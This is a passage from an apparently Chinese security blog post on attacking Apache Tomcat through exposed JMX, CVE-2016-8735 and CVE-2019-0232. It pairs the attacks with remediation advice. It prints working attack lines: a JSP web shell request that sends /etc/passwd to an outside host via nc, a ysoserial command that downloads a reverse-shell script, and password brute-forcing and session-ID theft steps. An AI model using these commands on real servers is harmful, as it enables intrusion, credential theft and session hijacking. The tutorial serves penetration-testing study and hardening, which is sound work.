src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910105316.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p>连接JXM的RMI接口的端口IP：<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910105416.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>单击Insecure connection按钮继续，当启用认证，通常会显示以下提示：<br>在这种情况下您应该使用username和password文本框输入一些有效的凭据，请注意也可能由于其他原因获得连接失败错误；<br>连接失败的常见原因之一是由于攻击者和服务器之间的防火墙；此防火墙可能配置为阻止传入流量到由Tomcat启动的其他Java RMI进程使用的端口<br>例如上面nmap扫描输出中列出的49222/tcp<br><br></p>\n<p>(3)使用Wireshrke进行判断：<br>在下面的示例中，Tomcat JMX服务器正在返回包含认证失败错误的RMI消息：<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910105524.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>请注意上面的错误包括需要凭据的字符串，表示在JConsole初始屏幕中未指定任何凭据；在输入一些凭据时返回不同的错误消息：<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910105608.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>如果未启用认证（这在某些内部网络渗透测试中可能是正确的），我们将考虑攻击者能够识别一个监听的Tomcat JMX接口并可以使用JConsole连接到它的情况。<br>这是可能的，因为认证未启用，或者因为攻击者能够猜到一些有效的凭据。<br><br></p>\n<p>(4)使用JMX读取Tomcat管理器的密码<br>假设Tomcat启用了管理器应用程序，但是没有使用任何弱凭据（如admin/admin或tomcat/manager）。<br>假设攻击者试图使用自动脚本来强制一个有效的密码而不成功,这个方法是在你的机器上面启动JConsole并且指向远程的Tomcat JMX服务器选择MBeans选项卡</p>\n<blockquote>\n<p>Users-&gt;User-&gt;”manager”-&gt;UserDatabase-&gt;Attributes</p>\n</blockquote>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910105750.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p>访问Tomcat管理器来破环底层服务器，执行此操作的典型方法是部署简单的Web应用程序存档（WAR），包括允许执行操作系统（OS）命令的代码，然后调查服务器上的内容。<br>如果服务器在Windows上运行，则大多数时间它将作为SYSTEM或管理员运行。因此你的操作系统命令将在最高权限级别运行。<br><br></p>\n<p>(5)日志循环函数中的目录遍历<br><em>如果由于某些原因Tomcat管理器不在那里怎么办？</em><br>虽然在内部网络中部署的服务器则不可能是这种情况，但是仍然有可能，因此我们需要另一种方法来浏览服务器，假设我们仍然能够连接Tomcat JMX接口。<br>日志循环函数:在大量的具有写权限的Tomcat JMX MBeans操作中，有一个显示了有趣的行为<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Catalina-&gt;Valve-&gt;localhost-&gt;AccessLogValve-&gt;Operations</span><br><span class=\"line\">boolean rotate(string newFileName)</span><br><span class=\"line\"><span class=\"comment\">#最后totate函数用此位置指定文件：</span></span><br><span class=\"line\">/tmp/test.log</span><br></pre></td></tr></table></figure></p>\n<p>这表明rotate函数用于备份Tomcat访问日志到服务器上的文件中。<br>完成这个过程后，下面的确认消息由服务器返回：<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910105949.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>可以确认test.log文件在tmp目录中,直到rotate函数被调用目录的内容是Tomcat访问日志。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bitnami@ubuntu:/tmp$ cat /tmp/test.log</span><br><span class=\"line\">  192.168.11.1 - - [08/Dec/2016:14:50:42 +0000] <span class=\"string\">\"GET /test-log-request HTTP/1.1\"</span> 404 1026</span><br></pre></td></tr></table></figure></p>\n<p>在服务器上面执行OS命令<br>正如上一节讨论的，rotate函数允许在服务器的任意目录中存储文件，它还将允许选择该文件的任意扩展。<br>作为一个攻击者，我们滥用它来在Tomcat提供网络服务的目录中创建一个Java Servlet Page（JSP）文件，在这里我们的目标创建包含JSP指令的文件来在服务器上面执行命令。<br>为了实现这个，我们首先需要的是使用在URL中包含有效的JSP代码的请求来破环Tomcat访问日志。</p>\n<p>例如，使用Burp Suite Repeater来发送下面的请求<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910110120.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>找到一个可靠的路径来存放我们的使用rotate函数的JSP文件，能利用JConsole界面中的一些信息；VM的Summary选项卡能提供一些关于catalina.base属性的信息。<br>这个选项卡包含一个节（在窗口底部），显示了Java VM的参数。<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910110131.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>Catalina.base目录应该返回一个webapps文件夹，其中是Tomcat提供的各种网络服务。<br>下面的截图是Tomcat服务器默认的应用的例子：<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910110208.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>将cataline.base目录的信息和Tomcat上的应用列表放在一起，找到存储我们JSP文件的目录还是可能的；<br>例如:一个test.jsp文件存储在/docs文件夹中,在这里上面的路径可以和rotate函数一起使用<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/opt/bitnami/apache-tomcat/webapps/docs/test.jsp</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910110310.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>包括一些调整允许使用管道将输出从一个命令重定向到另一个命令<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.11.141/docs/test.jsp?cmd=sh -c <span class=\"variable\">$@</span>|sh . <span class=\"built_in\">echo</span> /bin/cat /etc/passwd | nc 192.168.11.136 8080</span><br></pre></td></tr></table></figure><br>如果需要目前为止的web shell也可以用来执行wget命令，并从远程机器上面下载一个更多功能的JSP shell。</p>\n<p><br></p>\n<p>(6)捕获SMB challenge-responses hashes<br>然而有时可能出现不正确的情况，且服务器运行在域账户。如果那种情况，捕获SMB challenge-responses和破解他们是可能的。Rotate函数也在这里使用。<br>为了测试攻击场景，Kali虚拟机可以用来启动Metasploit SMB capture auxiliary module。<br>使用JConsole执行JMX连接，并且使用下面的参数使用rotate函数：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\\\192.168.11.136\\test</span><br></pre></td></tr></table></figure><br>在这种情况，上面的IP地址是Kali虚拟机。下面的截图确认了Tomcat向远程IP发送了一个请求，能够3次捕获SMB challenge：<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910110702.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>通过创建其他文件类型来进行client-side攻击<br>注意，rotate函数也能用来创建敏感文件（如HTML文件），并且在网络应用中存储他们，以便执行跨站脚本攻击。<br>这个涉及到，重复上述步骤，使用可靠的HTML代码污染日志文件，然后在Tomcat网络应用程序目录中存储一个HTML文件。<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910110709.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p><br></p>\n<p>(7)抓取网络应用的用户的session ID<br>另外的Tomcat JMX操作能被攻击者利用来劫持Tomcat网络应用的用户的会话，lisrSessionIds()在下面的节点显示：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Catalina-&gt;Manager-&gt;[ApplicationName]-&gt;Operations-&gt;listSessionIds()</span><br></pre></td></tr></table></figure><br>这个操作通常可用于Tomcat上部署的每个网络应用中，且如名称所示能返回连接应用的用户的所有的JSESSIONID。</p>\n<p>例如下面的截图显示了连接管理器应用的用户的session ID：<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910110750.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>通过Tomcat JMX服务可用的操作之一将允许检索JSESSIONID cookie值，因此可能允许攻击者通过劫持他们的会话来假冒另一个用户。<br>注意，由于需要该帐户的有效用户名和密码，因此无法利用此问题访问管理器应用程序。然而部署在服务器上的其他应用程序（例如支持基于JSESSIONID cookie的认证的应用程序）会受到影响。</p>\n<p>能够运行listSessionIds()数的攻击者将能够劫持另一个用户的会话，注意listSessionIds()是另一个操作，它只对具有写入权限的JMX用户可用。<br>如果JMX服务器配置为允许未经认证的访问，那么它仍然可以使用。<br><br></p>\n<p>(7)暴力破解进入Tomcat JMX<br>当Tomcat JMX服务配置为启用认证并且使用强密码时，仍有可能获得未经授权的访问。<br>实际上为此服务实现的认证过程在登录失败后不会锁定帐户，因此容易受到暴力密码破解攻击。<br>PoC工具（jmxbf）已经由作者开发来演示这个。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -jar jmxbf.jar</span><br><span class=\"line\">$&gt;java –jar jmxbf.jar –h 192.168.20.1 –p 1099 –uf usernames.txt –pf passwords.txt</span><br><span class=\"line\">github可以下载到：https:&#x2F;&#x2F;github.com&#x2F;nccgroup&#x2F;jmxbf</span><br></pre></td></tr></table></figure><br>正如已经提到的，MBeans操作的大列表和属性能提供给连接Tomcat JMX服务的用户使用。可能还有其他函数，可以使用与上面讨论的rotate函数问题所示的类似的方式。</p>\n<p>如果暴露了JMX服务器可以利用这些漏洞：（反序列化）<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name&#x3D;CVE-2016-3427 </span><br><span class=\"line\">http:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name&#x3D;CVE-2016-8735</span><br></pre></td></tr></table></figure><br>是却可以说如果你的Tomcat运行在老版本的Java系统中，是可能通过发送特定的包到JMX服务器来实现RCE。</p>\n<p><br></p>\n<p>(8)修复建议<br>首先，建议对JMX服务的访问使用防火墙。只有列入白名单的IP地址才能连接。<br>然而，应该始终启用强密码的认证，下面是在Windows使用setenv.bat启动认证的例子：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SET JAVA_HOME&#x3D;&#123;replace with full path to Java JDK&#125;</span><br><span class=\"line\">SET JRE_HOME&#x3D;%JAVA_HOME%</span><br><span class=\"line\">SET JAVA_OPTS&#x3D;%JAVA_OPTS% -Xms256m -Xmx512m -XX:MaxPermSize&#x3D;256m -server</span><br><span class=\"line\">SET CATALINA_OPTS&#x3D;-Dcom.sun.management.jmxremote </span><br><span class=\"line\">-Dcom.sun.management.jmxremote.port&#x3D;1099 </span><br><span class=\"line\">-Dcom.sun.management.jmxremote.rmi.port&#x3D;1099 </span><br><span class=\"line\">-Dcom.sun.management.jmxremote.ssl&#x3D;true </span><br><span class=\"line\">-Dcom.sun.management.jmxremote.local.only&#x3D;false </span><br><span class=\"line\">-Djava.rmi.server.hostname&#x3D;&#123;replace with Tomcat server IP address&#125;</span><br><span class=\"line\">SET CATALINA_OPTS&#x3D;%CATALINA_OPTS% </span><br><span class=\"line\">-Dcom.sun.management.jmxremote.authenticate&#x3D;true </span><br><span class=\"line\">-Dcom.sun.management.jmxremote.password.file&#x3D;%CATALINA_BASE%&#x2F;conf&#x2F;jmxremote.password </span><br><span class=\"line\">-Dcom.sun.management.jmxremote.access.file&#x3D;%CATALINA_BASE%&#x2F;conf&#x2F;jmxremote.access</span><br></pre></td></tr></table></figure></p>\n<p>下面是Linux下面使用setenv.sh的例子:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JAVA_HOME=&#123;replace with full path to Java JDK&#125;</span><br><span class=\"line\">JRE_HOME=<span class=\"variable\">$JAVA_HOME</span></span><br><span class=\"line\">JAVA_OPTS=<span class=\"string\">\"-Djava.awt.headless=true -XX:+UseG1GC -Dfile.encoding=UTF-8 <span class=\"variable\">$JAVA_OPTS</span> \"</span></span><br><span class=\"line\">JAVA_OPTS=<span class=\"string\">\"-XX:MaxPermSize=256M -Xms256M -Xmx512M <span class=\"variable\">$JAVA_OPTS</span> \"</span> </span><br><span class=\"line\">CATALINA_OPTS=<span class=\"string\">\"-Dcom.sun.management.jmxremote </span></span><br><span class=\"line\"><span class=\"string\">-Dcom.sun.management.jmxremote.port=1099 </span></span><br><span class=\"line\"><span class=\"string\">-Dcom.sun.management.jmxremote.rmi.port=1099 </span></span><br><span class=\"line\"><span class=\"string\">-Dcom.sun.management.jmxremote.ssl=true </span></span><br><span class=\"line\"><span class=\"string\">-Dcom.sun.management.jmxremote.local.only=false </span></span><br><span class=\"line\"><span class=\"string\">-Djava.rmi.server.hostname=&#123;replace with Tomcat server IP address&#125; </span></span><br><span class=\"line\"><span class=\"string\">-Dcom.sun.management.jmxremote.authenticate=true </span></span><br><span class=\"line\"><span class=\"string\">-Dcom.sun.management.jmxremote.password.file=../conf/jmxremote.password </span></span><br><span class=\"line\"><span class=\"string\">-Dcom.sun.management.jmxremote.access.file=../conf/jmxremote.access\"</span> </span><br><span class=\"line\"><span class=\"built_in\">export</span> JAVA_HOME</span><br><span class=\"line\"><span class=\"built_in\">export</span> JRE_HOME</span><br><span class=\"line\"><span class=\"built_in\">export</span> JAVA_OPTS</span><br><span class=\"line\"><span class=\"built_in\">export</span> CATALINA_OPTS</span><br></pre></td></tr></table></figure></p>\n<p>SSL也应该开启，以保护认证过程中凭据嗅探攻击。<br>注意，在上述所有的配置中，jmxremote.ssl变量设为true。</p>\n<p>下面的URL包含了这个任务的参考信息：<br><a href=\"https://db.apache.org/derby/docs/10.10/adminguide/radminjmxenablepwdssl.html\" target=\"_blank\" rel=\"noopener\">https://db.apache.org/derby/docs/10.10/adminguide/radminjmxenablepwdssl.html</a><br><a href=\"https://www.ibm.com/support/knowledgecenter/SSYMRC_6.0.1/com.ibm.jazz.repository.web.admin.doc/topics/t_server_mon_tomcat_option3.html\" target=\"_blank\" rel=\"noopener\">https://www.ibm.com/support/knowledgecenter/SSYMRC_6.0.1/com.ibm.jazz.repository.web.admin.doc/topics/t_server_mon_tomcat_option3.html</a><br>强烈推荐为只读和读写用户在jmxremote.password文件中设置高强度密码保护。</p>\n<p>另外只有Tomcat用户才被允许读取jmxremote.password文件，如果检测到这个文件的读权限太宽松Tomcat将不会启动。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cacls jmxremote.password /P [username]:R</span><br></pre></td></tr></table></figure></p>\n<p>关于rotate函数的问题，作者认为应该严格的控制，以避免Tomcat JMX服务器在服务器上可用的任何文件夹上创建具有任何扩展名的日志文件。<br>通过这个函数创建的日志文件只能在Tomcat日志文件夹中创建，并且无法使用URL访问。</p>\n<p>最后考虑在系统上存储一个哈希版本的Tomcat管理器密码（因为这个哈希将在JMX属性中可见）而不是纯文本版本。<br>注意，这是我们从Tomcat收到的一个建议，同时讨论了JMX只读用户能够读取管理器的密码的问题，然而这种情况下如果用户名还是明文，攻击者可以使用离线密码破解工具破解密码。</p>\n<p>下面的URL包含了存储哈希版本密码的一些参考：<br><a href=\"https://tomcat.apache.org/tomcat-8.0-doc/realm-howto.html#Digested_Passwords\" target=\"_blank\" rel=\"noopener\">https://tomcat.apache.org/tomcat-8.0-doc/realm-howto.html#Digested_Passwords</a><br><a href=\"http://www.jdev.it/encrypting-passwords-in-tomcat/\" target=\"_blank\" rel=\"noopener\">http://www.jdev.it/encrypting-passwords-in-tomcat/</a><br><a href=\"https://leanjavaengineering.wordpress.com/2011/02/04/tomcat-digested-passwords/\" target=\"_blank\" rel=\"noopener\">https://leanjavaengineering.wordpress.com/2011/02/04/tomcat-digested-passwords/</a> </p>\n<p>下面是digest工具的使用例子：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">digest.bat -s 0 -i 1 themanagersecretpassword</span><br><span class=\"line\"><span class=\"comment\">#根据Tomcat的推荐，当不使用-a参数，则默认使用SHA-512。</span></span><br><span class=\"line\"><span class=\"comment\">#注意在上面的例子中，-s和-i参数分别用于设置salt的长度和迭代次数。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#将输出明文和加密的凭据：</span></span><br><span class=\"line\">themanagersecretpassword:42052cec2459a6b4c383f2c43698d0528fe3f39756f8524763fc9e2997e77ebf1f1ba9bc0926b7395e32bb796e4ec0c1045e96c15c1edb510c2e295a5c11b095</span><br><span class=\"line\">&gt;digest.bat themanagersecretpassword  <span class=\"comment\">#返回&#123;salt&#125;$&#123;iterations&#125;$&#123;digest&#125;格式的输出</span></span><br><span class=\"line\">themanagersecretpassword:92cd45d5db0f5794c794bf4fb0cc975347978d53673ec3c946a28c199c209995<span class=\"variable\">$1</span><span class=\"variable\">$a27648ca5671b33692ebb95a80720903dfd50b</span></span><br></pre></td></tr></table></figure><br><br></p>\n<h4 id=\"0x06-CVE-2016-8735-远程代码执行\"><a href=\"#0x06-CVE-2016-8735-远程代码执行\" class=\"headerlink\" title=\"0x06 CVE-2016-8735(远程代码执行)\"></a>0x06 CVE-2016-8735(远程代码执行)</h4><p>描述:Apache Tomcat Remote Code Execution {JmxRemoteLifecycleListener-有限制},Tomcat是运行在Apache上的应用服务器，支持运行Servlet/JSP应用程序的容器——Tomcat可看作是Apache的扩展，不过实际上Tomcat也可以独立于Apache运行。<br>CVE 编号: CVE-2016-8735<br>漏洞概述：Oracle修复了JmxRemoteLifecycleListener反序列化漏洞(CVE-2016-3427)。<br>Tomcat也使用了JmxRemoteLifecycleListener这个监听器,但是Tomcat并没有及时升级，所以存在这个远程代码执行漏洞。</p>\n<p>受影响版本:</p>\n<ul>\n<li>Apache Tomcat 9.0.0.M1 to 9.0.0.M11</li>\n<li>Apache Tomcat 8.5.0 to 8.5.6</li>\n<li>Apache Tomcat 8.0.0.RC1 to 8.0.38</li>\n<li>Apache Tomcat 7.0.0 to 7.0.72</li>\n</ul>\n<p>利用条件：外部需要开启JmxRemoteLifecycleListener监听的10001和10002端口，来实现远程代码执行。</p>\n<p>漏洞PoC：<a href=\"https://github.com/frohoff/ysoserial\" target=\"_blank\" rel=\"noopener\">https://github.com/frohoff/ysoserial</a><br>Tomcat 8.0.36，conf/server.xml添加配置，必须添加catalina-jmx-remote.jar包，修改catalina文件配置；</p>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910112650.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910112748.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#H:\\工具包\\White\\框架漏洞Structure\\Java反序列</span></span><br><span class=\"line\">java -jar ysoserial-master.jar</span><br><span class=\"line\">java -cp ysoserial-master-v0.0.4.jar ysoserial.exploit.RMIRegistryExploit localhost 10001 Groovy1 calc.exe</span><br></pre></td></tr></table></figure>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910112810.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p>采用Ceye 的 DNSlog 回显看是否存在漏洞:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">构造命令：</span><br><span class=\"line\">Win ping 一次命令：ping -n 1 qjkpla.ceye.io</span><br><span class=\"line\">Linux ping 一次命令：ping -c 1 qjkpla.ceye.io</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910112902.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910112908.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p>采用nc反弹shell: <code>nc -l -vv 12555</code><br>然后构造命令：下载我们的反弹脚本:(之前用 bash 命令反弹没有成功所以使用 Python 脚本进行反弹)<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -cp ysoserial-0.0.4-all.jar ysoserial.exploit.RMIRegistryExploit 漏洞IP 端口 Groovy1 <span class=\"string\">\"wget http://0ke.org/back.py -O /tmp/x.py\"</span></span><br></pre></td></tr></table></figure></p>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910113002.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p>成功反弹：<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910113348.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>修复方案：<br>关闭JmxRemoteLifecycleListener功能，或者是对jmx JmxRemoteLifecycleListener远程端口进行网络访问控制，同时增加严格的认证方式。</p>\n<p><br></p>\n<h4 id=\"0x07-CVE-2019-0232-远程代码执行\"><a href=\"#0x07-CVE-2019-0232-远程代码执行\" class=\"headerlink\" title=\"0x07 CVE-2019-0232(远程代码执行)\"></a>0x07 CVE-2019-0232(远程代码执行)</h4><p>漏洞描述:在启用了enableCmdLineArguments的<code>Windows</code>上运行时，由于JRE将命令行参数传递给Windows的方式存在错误，CGI Servlet很容易受到远程执行代码的攻击。<br>CGI Servlet 默认是关闭的在Tomcat 以下版本将触发此漏洞。</p>\n<p><em>漏洞触发条件：</em></p>\n<ul>\n<li>1.Windows</li>\n<li>2.启用了CGIServlet（默认为关闭）</li>\n<li>3.启用了enableCmdLineArguments（Tomcat 9.0.*版本默认为关闭）</li>\n</ul>\n<p>影响版本：</p>\n<ul>\n<li>Apache Tomcat 9.0.0.M1to 9.0.17</li>\n<li>Apache Tomcat 8.5.0 to 8.5.39</li>\n<li>Apache Tomcat 7.0.0 to 7.0.93</li>\n</ul>\n<p>环境配置:<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#Modify Configuration</span><br><span class=\"line\">#(1)web.xml</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>cgi<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>org.apache.catalina.servlets.CGIServlet<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>debug<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>0<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>cgiPathPrefix<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>WEB-INF/cgi-bin<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>executable<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">load-on-startup</span>&gt;</span>5<span class=\"tag\">&lt;/<span class=\"name\">load-on-startup</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- The mapping for the CGI Gateway servlet 